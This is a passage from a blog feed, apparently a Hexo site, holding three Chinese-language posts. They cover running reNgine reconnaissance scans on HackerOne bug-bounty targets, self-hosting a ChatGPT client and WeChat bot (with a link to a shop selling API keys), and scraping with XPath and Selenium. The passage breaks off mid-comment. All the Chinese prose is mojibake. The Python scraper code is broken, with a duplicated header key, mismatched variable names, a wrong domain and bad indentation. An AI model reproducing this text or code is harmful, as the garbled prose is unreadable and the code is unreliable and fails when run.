title="2.ä½¿ç”¨(é…åˆhackone)"></a>2.ä½¿ç”¨(é…åˆhackone)</h1><p>æ–‡æ¡£:<a href="https://rengine.wiki/usage/">https://rengine.wiki/usage/</a></p><h2 id="2-1è®¾ç«‹ç›®æ ‡"><a href="#2-1è®¾ç«‹ç›®æ ‡" class="headerlink" title="2.1è®¾ç«‹ç›®æ ‡"></a>2.1è®¾ç«‹ç›®æ ‡</h2><p>1.è¿›å…¥hackoneæ‰¾é¡¹ç›®<br><a href="https://hackerone.com/opportunities/all">https://hackerone.com/opportunities/all</a><br>æŸ¥æ‰¾é¡¹ç›®åŸŸå<br>ä»¥inDriveä¸ºä¾‹ï¼š<br>æ‰¾åˆ°è¢«æˆæƒçš„åŸŸå<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307151144810.png"></p><p>2.rengineä¸­æ·»åŠ ç›®æ ‡<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307151145857.png"></p><p>ä¸€æ¬¡æ·»åŠ å¤šä¸ªç›®æ ‡<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307151149097.png"></p><p>3.åœ¨ç»„ç»‡ä¸­åˆ›å»ºä¸€ä¸ªç»„ï¼Œå°†å†…å®¹æ·»åŠ è¿›å»<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307151151584.png"></p><h2 id="2-2è‡ªåŠ¨åŒ–æŠ¥å‘Š"><a href="#2-2è‡ªåŠ¨åŒ–æŠ¥å‘Š" class="headerlink" title="2.2è‡ªåŠ¨åŒ–æŠ¥å‘Š"></a>2.2è‡ªåŠ¨åŒ–æŠ¥å‘Š</h2><p>1.æ‰“å¼€hackone settings<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307151201456.png"><br>ä¾æ®æç¤ºé…ç½®å¥½usernameå’Œapi token</p><p>2.ä¸‹æ–¹å¯è°ƒæ•´æŠ¥å‘Šæ ·å¼<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307151204874.png"></p><h2 id="2-3è¿è¡Œæ‰«æ"><a href="#2-3è¿è¡Œæ‰«æ" class="headerlink" title="2.3è¿è¡Œæ‰«æ"></a>2.3è¿è¡Œæ‰«æ</h2><p>1.Targets-&gt;å…¨é€‰-&gt;Scan Multiple Targets<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307151229163.png"></p><p>2.é€‰æ‹©æ‰«æç±»å‹,Start Scan<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307151230816.png"></p><p>3.ç­‰å¾…æ‰«æç»“æœå³å¯<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307151209709.png"></p><h1 id="3-å‚è€ƒæ–‡ç« "><a href="#3-å‚è€ƒæ–‡ç« " class="headerlink" title="3.å‚è€ƒæ–‡ç« "></a>3.å‚è€ƒæ–‡ç« </h1><p><a href="https://wiki.sheep0818.xyz/doc/156/">https://wiki.sheep0818.xyz/doc/156/</a></p>]]></content>
      
      
      <categories>
          
          <category> ç½‘å®‰ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SRC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ChatGPTæœ¬åœ°æ­å»ºä¸å¾®ä¿¡æ­å»º</title>
      <link href="/2023/07/14/ChatGPT%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%BE%AE%E4%BF%A1%E6%90%AD%E5%BB%BA/"/>
      <url>/2023/07/14/ChatGPT%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%BE%AE%E4%BF%A1%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="ChatGPTæœ¬åœ°æ­å»ºä¸å¾®ä¿¡æ­å»º"><a href="#ChatGPTæœ¬åœ°æ­å»ºä¸å¾®ä¿¡æ­å»º" class="headerlink" title="ChatGPTæœ¬åœ°æ­å»ºä¸å¾®ä¿¡æ­å»º"></a>ChatGPTæœ¬åœ°æ­å»ºä¸å¾®ä¿¡æ­å»º</h1><h2 id="1-æœ¬åœ°æ­å»º"><a href="#1-æœ¬åœ°æ­å»º" class="headerlink" title="1.æœ¬åœ°æ­å»º"></a>1.æœ¬åœ°æ­å»º</h2><p>è·å–api:<br><a href="https://platform.openai.com/account/api-keys">https://platform.openai.com/account/api-keys</a></p><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307141404961.png"><br>ç‚¹å‡»Create new secret key</p><p>æˆ–è€…åœ¨å¦‚ä¸‹é“¾æ¥ä¸­è´­ä¹°<br><a href="https://appsir.shop/product/wukClRPsAdq9fXI7">https://appsir.shop/product/wukClRPsAdq9fXI7</a></p><p>è¾“å…¥nameåï¼Œå¾—åˆ°KEY(API KEYä¸€å®šè¦å¤åˆ¶ä¿å­˜,åªå¯ä»¥åœ¨è¿™é‡Œçœ‹åˆ°ä¸€æ¬¡key)<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307141406933.png"><br>æœ¬åœ°å¼€æºé¡¹ç›®<br><a href="https://github.com/869413421/chatgpt-web">https://github.com/869413421/chatgpt-web</a><br>ä¸‹è½½å¯¹åº”çš„ç‰ˆæœ¬å³å¯ï¼Œè¿™é‡Œæ¼”ç¤ºwindowsç‰ˆ<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307141415340.png"><br>1.å°†config.dev.jsonæ–‡ä»¶åæ”¹ä¸ºconfig.json<br>2.æ‰“å¼€config.jsonå®Œæˆç›¸å…³å†…å®¹çš„å¡«å†™ï¼Œå¯å‚è€ƒä¸‹å›¾</p><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307141440634.png"></p><p>è¿è¡Œchatgpt-web.exe,è®¿é—®æœ¬åœ°8088ç«¯å£,è¾“å…¥ç”¨æˆ·åå¯†ç ç™»é™†å,å³å¯ä½¿ç”¨</p><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307141439226.png"></p><h2 id="2-åœ¨çº¿å¾®ä¿¡æ­å»º"><a href="#2-åœ¨çº¿å¾®ä¿¡æ­å»º" class="headerlink" title="2.åœ¨çº¿å¾®ä¿¡æ­å»º"></a>2.åœ¨çº¿å¾®ä¿¡æ­å»º</h2><p>éœ€è¦ç¯å¢ƒ:git golang</p><p>ä»¥debianä¸ºä¾‹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt install git</span><br><span class="line">apt install golang</span><br><span class="line">å¦‚æœä»æºä¸‹è½½goç‰ˆæœ¬è¿‡ä½ï¼Œå¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç« å®‰è£…æ–°ç‰ˆæœ¬</span><br><span class="line">https://blog.csdn.net/xiaochong0302/article/details/130666663</span><br></pre></td></tr></table></figure><p>é¡¹ç›®åœ°å€</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://www.github.com/ZYallers/chatgpt_wechat_robot.git</span><br></pre></td></tr></table></figure><p>è¿›å…¥åˆ°é¡¹ç›®ç›®å½•,å°†jsoné…ç½®æ–‡ä»¶å¤åˆ¶ä¸€ä»½</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd chatgpt_wechat_robot</span><br><span class="line">cp config.dev.json config.json</span><br></pre></td></tr></table></figure><p>ç¼–è¾‘config.jsonï¼Œå°†è‡ªå·±çš„apikeyå†™è¿›å»<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307141554405.png"></p><p>è¿è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">go run main.go</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307141915131.png"></p><p>è®¿é—®ç½‘å€ï¼Œç”¨é—²ç½®å¾®ä¿¡æ‰«æäºŒç»´ç ç™»å½•ç»‘å®š,åå³å¯ä½¿ç”¨</p><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307142029319.png"></p><p>ä½¿ç”¨å®ä¾‹:</p><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307142029888.jpg"></p><p>æŒ‚åå°ä½¿ç”¨å¯ä»¥ç”¨screenè¿è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">screen go run main.go</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> å·¥å…· </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å·¥å…· </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pythonçˆ¬è™«-Seleniumæ¡†æ¶ä½¿ç”¨</title>
      <link href="/2023/07/13/Selenium%E5%9F%BA%E7%A1%80/"/>
      <url>/2023/07/13/Selenium%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h1 id="Selenium4-xpath"><a href="#Selenium4-xpath" class="headerlink" title="Selenium4+xpath"></a>Selenium4+xpath</h1><h2 id="1-ç®€ä»‹"><a href="#1-ç®€ä»‹" class="headerlink" title="1.ç®€ä»‹"></a>1.ç®€ä»‹</h2><p>  Seleniumæ˜¯å½“å‰å¹¿æ³›ä½¿ç”¨çš„å¼€æºè‡ªåŠ¨åŒ–æµ‹è¯•æ¡†æ¶ä¹‹ä¸€ï¼Œå®ƒæä¾›äº†ä¸°å¯Œçš„å·¥å…·å’Œåº“ï¼Œç”¨äºè‡ªåŠ¨åŒ–æµ‹è¯•Webåº”ç”¨ç¨‹åºã€‚</p><p>  Seleniumçš„ä¸»è¦åŠŸèƒ½æ˜¯æ¨¡æ‹Ÿç”¨æˆ·ä¸Webåº”ç”¨ç¨‹åºçš„äº¤äº’ï¼Œå¹¶èƒ½å¤Ÿè‡ªåŠ¨åŒ–æ‰§è¡Œå„ç§æ“ä½œï¼Œå¦‚ç‚¹å‡»æŒ‰é’®ã€å¡«å†™è¡¨å•ã€éªŒè¯é¡µé¢å…ƒç´ ç­‰ã€‚é€šè¿‡è¿™ç§æ–¹å¼ï¼Œæµ‹è¯•äººå‘˜å¯ä»¥å¿«é€Ÿæœ‰æ•ˆåœ°æ‰§è¡Œå¤§è§„æ¨¡çš„æµ‹è¯•ï¼Œå¹¶éªŒè¯åº”ç”¨ç¨‹åºåœ¨å„ç§æƒ…å†µä¸‹çš„å¯é æ€§å’Œç¨³å®šæ€§ã€‚</p><p>  åœ¨å®é™…æ¸—é€æ—¶,æˆ‘ä»¬æœ‰æ—¶éœ€è¦æ¨¡æ‹Ÿäººç±»å¯¹ç½‘ç«™è¿›è¡Œè®¿é—®ï¼Œæˆ–å¯¹ç½‘ç«™è¿›è¡ŒæŸäº›è‡ªåŠ¨åŒ–è¡Œä¸ºï¼Œæˆ‘ä»¬å¯ä»¥å€ŸåŠ©Seleniumæ¡†æ¶å®ç°ã€‚</p><h2 id="2-xpath"><a href="#2-xpath" class="headerlink" title="2.xpath"></a>2.xpath</h2><h3 id="2-1xpathç®€ä»‹"><a href="#2-1xpathç®€ä»‹" class="headerlink" title="2.1xpathç®€ä»‹"></a>2.1xpathç®€ä»‹</h3><p>XPathä½¿ç”¨ä¸€ç§ç±»ä¼¼äºç›®å½•ç»“æ„çš„è·¯å¾„è¡¨è¾¾å¼ï¼Œè¯¥è¡¨è¾¾å¼å¯ä»¥ä»æ ¹èŠ‚ç‚¹å¼€å§‹æˆ–å½“å‰èŠ‚ç‚¹å¼€å§‹ï¼Œé€šè¿‡å±‚çº§å…³ç³»å’Œæ¡ä»¶ç­›é€‰æ¥å®šä½æ‰€éœ€çš„èŠ‚ç‚¹ã€‚XPathæ”¯æŒå¹¿æ³›çš„èŠ‚ç‚¹é€‰æ‹©ç¬¦å·ï¼Œå¦‚æ ‡ç­¾åã€å±æ€§å€¼ã€ä½ç½®ã€é€»è¾‘è¿ç®—ç¬¦ç­‰ï¼Œä»è€Œå®ç°çµæ´»çš„èŠ‚ç‚¹é€‰æ‹©å’Œè¿‡æ»¤ã€‚</p><h3 id="2-2å®‰è£…æ¨¡å—"><a href="#2-2å®‰è£…æ¨¡å—" class="headerlink" title="2.2å®‰è£…æ¨¡å—"></a>2.2å®‰è£…æ¨¡å—</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install lxml</span><br></pre></td></tr></table></figure><h3 id="2-3xpathä½¿ç”¨"><a href="#2-3xpathä½¿ç”¨" class="headerlink" title="2.3xpathä½¿ç”¨"></a>2.3xpathä½¿ç”¨</h3><h4 id="2-3-1-etree"><a href="#2-3-1-etree" class="headerlink" title="2.3.1.etree"></a><strong>2.3.1.etree</strong></h4><p>etree æŠŠ htmlæºç å˜æˆå¯¹è±¡</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    url = <span class="string">&quot;http://www.4399dmw.com/donghua/&quot;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;User-agent&quot;</span>:<span class="string">&quot;User-agent&quot;</span>:<span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    resp = requests.get(url=url,headers=headers)</span><br><span class="line">    <span class="comment">#ç½‘é¡µçš„æºç </span></span><br><span class="line">    html_doc = resp.content.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    <span class="comment">#ä½¿ç”¨etreeå»è½¬åŒ–html_doc,è½¬åŒ–ä¸ºäº†ä¸€ä¸ªhtmlçš„å¯¹è±¡,æ­¤æ—¶elementå¯¹è±¡å¯ä»¥ä½¿ç”¨xpathè¯­æ³•</span></span><br><span class="line">    html = etree.HTML(html_doc)</span><br><span class="line">    <span class="built_in">print</span>(html.xpath(<span class="string">&quot;xpathè¯­æ³•&quot;</span>))</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h4 id="2-3-2xpathè¯­æ³•"><a href="#2-3-2xpathè¯­æ³•" class="headerlink" title="2.3.2xpathè¯­æ³•"></a><strong>2.3.2xpathè¯­æ³•</strong></h4><p>xpathè¯­æ³•ä¸­[1]å°±æ˜¯ç¬¬ä¸€ä¸ª</p><p>åŸºç¡€ç”¨æ³•</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//aæŸ¥è¯¢å½“å‰HTMLé¡µé¢æ‰€æœ‰çš„aæ ‡ç­¾</span><br><span class="line">//a/@hrefå½“å‰htmlé¡µé¢ä¸­æ‰€æœ‰aæ ‡ç­¾ä¸­çš„hrefçš„å±æ€§å†…å®¹</span><br><span class="line">//a/text() æ‰€æœ‰aæ ‡ç­¾ä¸­çš„æ–‡æœ¬å†…å®¹</span><br></pre></td></tr></table></figure><p>å±æ€§å¤„ç†</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//img/@srcæ‹¿åˆ°æ‰€æœ‰imgæ ‡ç­¾ä¸­srcçš„å†…å®¹</span><br><span class="line">//a/img/@src æ‹¿åˆ°æ‰€æœ‰aæ ‡ç­¾ä¸­çš„imgæ ‡ç­¾é‡Œçš„srcçš„å†…å®¹</span><br><span class="line">//img[@alt=&#x27;æŸä¸ªå€¼&#x27;]/@src é€‰æ‹©imgæ ‡ç­¾ä¸­altæ˜¯æŸä¸ªå€¼çš„æ ‡ç­¾å¹¶ä¸”æå–srcå€¼</span><br></pre></td></tr></table></figure><p>classæ ‡ç­¾å¤„ç†</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//a[@class=&#x27;u-card&#x27;][1]/img é€‰åˆ°æ‰€æœ‰çš„aæ ‡ç­¾ä¸‹çš„classçš„å€¼ä¸ºu-cardä¸­çš„ç¬¬1ä¸ªçš„imgæ ‡ç­¾</span><br><span class="line">//div[@class=&#x27;lst-item&#x27;][3]/a[4]/img é€‰å–é¡µé¢ä¸­æ‰€æœ‰divä¸”classç­‰äºlst-itemé€‰æ‹©å…¶ä¸­ç¬¬ä¸‰ä¸ª,åœ¨æ­¤ä¹‹ä¸‹é€‰æ‹©ç¬¬å››ä¸ªaæ ‡ç­¾ä¸‹çš„imgæ ‡ç­¾</span><br><span class="line">//div[@class=&#x27;lst-item&#x27;][1]/a[last()]/img è¿™é‡Œçš„aæ ‡ç­¾æ˜¯é€‰æ‹©æœ€åä¸€ä¸ª</span><br></pre></td></tr></table></figure><p>pæ ‡ç­¾</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//p[text=&#x27;è¶…å˜æ­¦å…½ç¬¬äºŒå­£&#x27;]æŸ¥æ‰¾æ‰€æœ‰pæ ‡ç­¾ä¸­,æ–‡å­—å†…å®¹æ˜¯xxxçš„</span><br><span class="line">//p[contains(text(),&#x27;èœ¡ç¬”&#x27;)] æŸ¥æ‰¾æ‰€æœ‰pæ ‡ç­¾ä¸­,åŒ…å«æŸäº›æ–‡å­—çš„</span><br><span class="line">//p[@*]é¡µé¢ä¸­æ‰€æœ‰pæ ‡ç­¾å‡¡æ˜¯å¸¦æœ‰å±æ€§çš„éƒ½é€‰å‡ºæ¥</span><br></pre></td></tr></table></figure><p>divæ ‡ç­¾</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//div[@class=&#x27;lst-item&#x27;][2]/*</span><br><span class="line">å°†æ‰€æœ‰divæ ‡ç­¾classå±æ€§ç­‰äºlst-itemä¸­çš„ç¬¬äºŒä¸ªä¸­çš„æ‰€æœ‰å†…å®¹</span><br><span class="line"></span><br><span class="line">//div[@class=&#x27;m-lst&#x27;]/div[position()=4]</span><br><span class="line">é€‰æ‹©é¡µé¢ä¸­æ‰€æœ‰classæ˜¯m-lsçš„divä¸­çš„ç¬¬å››ä¸ªdiv</span><br></pre></td></tr></table></figure><h4 id="2-3-3å®æˆ˜"><a href="#2-3-3å®æˆ˜" class="headerlink" title="2.3.3å®æˆ˜"></a>2.3.3å®æˆ˜</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">url = <span class="string">&quot;http://www.4399dmw.com/search/dh-1-0-0-0-0-0-0/&quot;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;User-agent&quot;</span>:<span class="string">&quot;User-agent&quot;</span>:<span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    resp = requests.get(url=url,headers=headers)</span><br><span class="line">    <span class="comment">#ç½‘é¡µçš„æºç </span></span><br><span class="line">    html_doc = resp.content.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    <span class="comment">#ä½¿ç”¨etreeå»è½¬åŒ–html_doc,è½¬åŒ–ä¸ºäº†ä¸€ä¸ªhtmlçš„å¯¹è±¡,æ­¤æ—¶elementå¯¹è±¡å¯ä»¥ä½¿ç”¨xpathè¯­æ³•</span></span><br><span class="line">    html = etree.HTML(html_doc)</span><br><span class="line">    donghuatitle = html.xpath(<span class="string">&quot;//div[@class=&#x27;u-ct&#x27;]/p[@class=&#x27;u-tt&#x27;]/text()&quot;</span>)</span><br><span class="line">    donghuapic = html.xpath(<span class="string">&quot;//div[@class=&#x27;lst&#x27;]/a/img/@data-src&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(donghuatitle)</span><br><span class="line">    <span class="built_in">print</span>(donghuapic)</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>æŠŠæ¯ä¸€é¡µéƒ½çˆ¬ä¸‹æ¥,è‡ªåŠ¨å¯»æ‰¾ä¸‹ä¸€é¡µ</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="comment">#é¡µé¢å†…çˆ¬è™«</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pachong</span>(<span class="params">url</span>):</span><br><span class="line">    url = url</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;User-agent&quot;</span>:<span class="string">&quot;User-agent&quot;</span>:<span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    resp = requests.get(url=url,headers=headers)</span><br><span class="line">    <span class="comment">#ç½‘é¡µçš„æºç </span></span><br><span class="line">    html_doc = resp.content.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    <span class="comment">#ä½¿ç”¨etreeå»è½¬åŒ–html_doc,è½¬åŒ–ä¸ºäº†ä¸€ä¸ªhtmlçš„å¯¹è±¡,æ­¤æ—¶elementå¯¹è±¡å¯ä»¥ä½¿ç”¨xpathè¯­æ³•</span></span><br><span class="line">    html = etree.HTML(html_doc)</span><br><span class="line">    donghuatitle = html.xpath(<span class="string">&quot;//div[@class=&#x27;u-ct&#x27;]/p[@class=&#x27;u-tt&#x27;]/text()&quot;</span>)</span><br><span class="line">    donghuapic = html.xpath(<span class="string">&quot;//div[@class=&#x27;lst&#x27;]/a/img/@data-src&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(donghuatitle)</span><br><span class="line">    <span class="built_in">print</span>(donghuapic)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="comment">#å‘ç°ä¸‹ä¸€é¡µ</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_next_page</span>(<span class="params">url</span>):</span><br><span class="line">url = url</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;User-agent&quot;</span>:<span class="string">&quot;User-agent&quot;</span>:<span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    resp = requests.get(url=url,headers=headers)</span><br><span class="line">    <span class="comment">#ç½‘é¡µçš„æºç </span></span><br><span class="line">    html_doc = resp.content.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    html = etree.HTML(html_doc)</span><br><span class="line">    next_page = html.xpath(<span class="string">&quot;//a[contains(text(),&#x27;ä¸‹ä¸€é¡µ&#x27;)]/@href&quot;</span>)</span><br><span class="line">    really_next_page = <span class="string">&quot;http://www.4399.dmw.com&quot;</span>+nextpage[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">return</span> real_next_page</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    url = <span class="string">&quot;http://www.4399dmw.com/search/dh-1-0-0-0-0-1-0/&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;å¼€å§‹çˆ¬è¡Œçš„url:&quot;</span>+url)</span><br><span class="line">            pachong(url)</span><br><span class="line">      url = find_next_page(url)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;æœ€åä¸€é¡µä¹Ÿçˆ¬è¡Œå®Œäº†&quot;</span>)</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>åœ¨æµè§ˆå™¨ä¸­ä¸­å¯ä¸‹è½½xpathæ’ä»¶,æ–¹ä¾¿å†™xpathè¯­æ³•åŒ¹é…å†…å®¹,</p><p>è¿™é‡Œæ¨è</p><p><a href="https://chrome.google.com/webstore/detail/xpath-helper/hgimnogjllphhhkhlmebbmlgjoejdpjl?hl=zh-CN">https://chrome.google.com/webstore/detail/xpath-helper/hgimnogjllphhhkhlmebbmlgjoejdpjl?hl=zh-CN</a></p><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307121720420.png"></p><h2 id="3-selenium"><a href="#3-selenium" class="headerlink" title="3.selenium"></a>3.selenium</h2><h3 id="3-1ç®€ä»‹"><a href="#3-1ç®€ä»‹" class="headerlink" title="3.1ç®€ä»‹"></a>3.1ç®€ä»‹</h3><p>Seleniumæ˜¯ä¸€æ¬¾å¼ºå¤§çš„å¼€æºè‡ªåŠ¨åŒ–æµ‹è¯•å·¥å…·ï¼Œç”¨äºæ¨¡æ‹Ÿå’Œæ§åˆ¶æµè§ˆå™¨è¡Œä¸ºï¼Œå®ç°å¯¹Webåº”ç”¨ç¨‹åºçš„è‡ªåŠ¨åŒ–æµ‹è¯•ã€‚å®ƒæ”¯æŒå¤šç§ç¼–ç¨‹è¯­è¨€å’Œæµè§ˆå™¨ï¼Œæä¾›äº†ä¸°å¯Œçš„åŠŸèƒ½å’Œçµæ´»çš„APIï¼Œæ˜¯å¼€å‘äººå‘˜å’Œæµ‹è¯•äººå‘˜é¦–é€‰çš„è‡ªåŠ¨åŒ–æµ‹è¯•è§£å†³æ–¹æ¡ˆã€‚</p><h3 id="3-2å®‰è£…"><a href="#3-2å®‰è£…" class="headerlink" title="3.2å®‰è£…"></a>3.2å®‰è£…</h3><p>1.seleniumæ¨¡å—</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install selenium</span><br></pre></td></tr></table></figure><p>æ‰‹åŠ¨ä¸‹è½½chromedriver:</p><p><a href="https://vikyd.github.io/download-chromium-history-version/#/">https://vikyd.github.io/download-chromium-history-version/#/</a></p><p>æ³¨æ„:éœ€è¦ä¸‹è½½chromeå¯¹åº”ç‰ˆæœ¬çš„é©±åŠ¨ä½¿ç”¨</p><p>è‡ªåŠ¨å®‰è£…:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install webdriver-manager</span><br><span class="line">pip install packaging</span><br></pre></td></tr></table></figure><p>ä¹‹åå»ºç«‹ä¸€æ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from selenium import webdriver</span><br><span class="line">from webdriver_manager.chrome import ChromeDriverManager</span><br><span class="line"></span><br><span class="line">driver = webdriver.Chrome(ChromeDriverManager().install())</span><br><span class="line">driver.get(&quot;https://www.baidu.com/&quot;)</span><br><span class="line">driver.quit()</span><br></pre></td></tr></table></figure><p>è¿›åº¦æ¡æ»¡åè‡ªåŠ¨åˆ™å®‰è£…æˆåŠŸ</p><h3 id="3-3ä½¿ç”¨"><a href="#3-3ä½¿ç”¨" class="headerlink" title="3.3ä½¿ç”¨"></a>3.3ä½¿ç”¨</h3><p>1.æ‰“å¼€ç½‘é¡µ</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">driver = webdriver.Chrome()</span><br><span class="line">driver.get(<span class="string">&quot;https://www.baidu.com/&quot;</span>)</span><br><span class="line">time.sleep(<span class="number">5</span>)</span><br><span class="line">driver.quit()</span><br></pre></td></tr></table></figure><p>2.æŒ‰é”®åŒ…</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#å¼•å…¥é”®ç›˜æŒ‰é”®åŒ…</span></span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.keys <span class="keyword">import</span> Keys</span><br><span class="line">    driver.find_element(<span class="string">&quot;id&quot;</span>, <span class="string">&quot;kw&quot;</span>).send_keys(<span class="string">&quot;this s a test&quot;</span>)</span><br><span class="line">    <span class="comment">#ç»„åˆé”®è¾“å…¥é”®ç›˜ä¸Šçš„ctrl+a</span></span><br><span class="line">    driver.find_element(<span class="string">&quot;id&quot;</span>, <span class="string">&quot;kw&quot;</span>).send_keys(Keys.CONTROL,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    <span class="comment">#è¾“å…¥é”®ç›˜ä¸Šçš„ENTER</span></span><br><span class="line">    driver.find_element(<span class="string">&quot;id&quot;</span>, <span class="string">&quot;kw&quot;</span>).send_keys(Keys.ENTER)</span><br></pre></td></tr></table></figure><p>3.é…ç½®æµè§ˆå™¨å¯åŠ¨ä½¿ç”¨Optionç±»</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># å¯¼å…¥Optionç±»</span></span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.chrome.options <span class="keyword">import</span> Options</span><br><span class="line"><span class="comment"># å®ä¾‹åŒ–ä¸€ä¸ªOptionç±»çš„å¯¹è±¡</span></span><br><span class="line">options = Options()</span><br><span class="line"></span><br><span class="line"><span class="comment"># é…ç½®æµè§ˆå™¨æ˜¾ç¤ºå¤§å°</span></span><br><span class="line">options.add_argument(<span class="string">&#x27;--window-size=1366,768&#x27;</span>)  </span><br><span class="line"><span class="comment">#Optionè¿˜å¸¸ç”¨ä¸€ä¸‹</span></span><br><span class="line"><span class="comment">#--user-agent=&quot;&quot; è®¾ç½®è¯·æ±‚å¤´çš„User-Agent</span></span><br><span class="line"><span class="comment">#--window-size=1366,768 è®¾ç½®æµè§ˆå™¨åˆ†è¾¨ç‡ï¼ˆçª—å£å¤§å°ï¼‰</span></span><br><span class="line"><span class="comment">#--headless 